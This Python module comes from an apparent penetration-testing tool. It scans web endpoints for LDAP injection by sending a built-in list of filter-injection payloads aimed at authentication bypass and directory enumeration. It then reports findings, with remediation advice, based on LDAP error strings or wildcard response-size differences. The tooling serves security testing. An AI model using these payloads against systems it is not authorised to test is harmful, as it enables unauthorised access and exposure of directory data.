"""LDAP injection detection module."""

from __future__ import annotations

from typing import Any

from pencheff.config import Severity
from pencheff.core.findings import Evidence, Finding
from pencheff.core.http_client import PencheffHTTPClient
from pencheff.core.payload_loader import load_payloads
from pencheff.core.session import PentestSession
from pencheff.modules.base import BaseTestModule
from pencheff.modules.injection import param_names

LDAP_PAYLOADS = [
    "*",
    "*)(&",
    "*)(uid=*))(|(uid=*",
    "admin)(&)",
    "*()|%26'",
    "admin)(%26(password=*))",
    "*)(objectClass=*",
    ")(cn=*",
    "*)%00",
    "*))%00",
    "*(|(mail=*))",
    "*(|(objectclass=*))",
    "*))(|(uid=*",
    "admin)(|(password=*",
    "x])+OR+1=1)%00",
]

LDAP_PARAMS = [
    "user", "username", "login", "uid", "cn", "dn",
    "filter", "search", "query", "name", "email",
    "member", "group", "ou",
]


class LDAPInjectionModule(BaseTestModule):
    """Detect LDAP injection vulnerabilities."""

    name = "ldap_injection"
    category = "ldap"
    owasp_categories = ["A03"]
    description = "LDAP injection: authentication bypass, data exfiltration, blind LDAP"

    def get_techniques(self) -> list[str]:
        return ["ldap_auth_bypass", "ldap_filter_injection", "blind_ldap"]

    async def run(
        self,
        session: PentestSession,
        http: PencheffHTTPClient,
        targets: list[str] | None = None,
        config: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings: list[Finding] = []
        endpoints = self._get_target_endpoints(session, targets)
        payloads = load_payloads("ldap.txt") or LDAP_PAYLOADS

        for ep in self._cap_endpoints(endpoints, 20):
            url = ep["url"]
            method = ep.get("method", "GET")
            params = param_names(ep.get("params", []))

            # Identify LDAP-likely parameters
            test_params = [p for p in params if p.lower() in LDAP_PARAMS]
            if not test_params:
                test_params = list(LDAP_PARAMS[:4])

            for param_name in test_params:
                # Get baseline response
                try:
                    baseline = await http.request(
                        method, url,
                        params={param_name: "testuser"},
                        module="ldap_injection",
                    )
                    baseline_status = baseline.status_code
                    baseline_len = len(baseline.text)
                except Exception:
                    continue

                for payload in payloads[:10]:
                    try:
                        resp = await http.request(
                            method, url,
                            params={param_name: payload},
                            module="ldap_injection",
                        )

                        # Detection: error messages or significant response differences
                        body_lower = resp.text.lower()
                        ldap_errors = [
                            "ldap", "invalid dn", "bad search filter",
                            "javax.naming", "ldapexception", "search filter",
                            "invalid filter", "unbalanced parenthesis",
                        ]

                        if any(err in body_lower for err in ldap_errors):
                            findings.append(Finding(
                                title=f"LDAP Injection: {url} [{param_name}]",
                                severity=Severity.HIGH,
                                category="ldap",
                                owasp_category="A03",
                                description=(
                                    f"LDAP injection detected at parameter '{param_name}'. "
                                    f"The server returned LDAP-specific error messages in response "
                                    f"to filter injection payloads. This can lead to authentication "
                                    f"bypass and directory data exfiltration."
                                ),
                                remediation=(
                                    "Use parameterized LDAP queries. Escape special characters "
                                    "(*, (, ), \\, NUL) in user input before LDAP filter construction. "
                                    "Apply input validation whitelists."
                                ),
                                endpoint=url,
                                parameter=param_name,
                                evidence=[Evidence(
                                    request_method=method,
                                    request_url=url,
                                    request_body=f"{param_name}={payload}",
                                    response_status=resp.status_code,
                                    response_body_snippet=resp.text[:300],
                                    description=f"LDAP error triggered by payload: {payload}",
                                )],
                                cwe_id="CWE-90",
                                cvss_score=8.6,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:H",
                            ))
                            break

                        # Boolean-based blind LDAP: wildcard returns more data
                        if payload == "*" and resp.status_code == 200:
                            if len(resp.text) > baseline_len * 1.5 and baseline_len > 50:
                                findings.append(Finding(
                                    title=f"Blind LDAP Injection: {url} [{param_name}]",
                                    severity=Severity.HIGH,
                                    category="ldap",
                                    owasp_category="A03",
                                    description=(
                                        f"Blind LDAP injection detected. Wildcard '*' in parameter "
                                        f"'{param_name}' returned significantly more data than normal "
                                        f"input, suggesting LDAP filter injection."
                                    ),
                                    remediation="Escape LDAP special characters. Use parameterized queries.",
                                    endpoint=url,
                                    parameter=param_name,
                                    evidence=[Evidence(
                                        request_method=method,
                                        request_url=url,
                                        request_body=f"{param_name}=*",
                                        response_status=resp.status_code,
                                        description=f"Wildcard response: {len(resp.text)} bytes vs baseline: {baseline_len} bytes",
                                    )],
                                    cwe_id="CWE-90",
                                    cvss_score=7.5,
                                ))
                                break

                    except Exception:
                        continue

        return findings
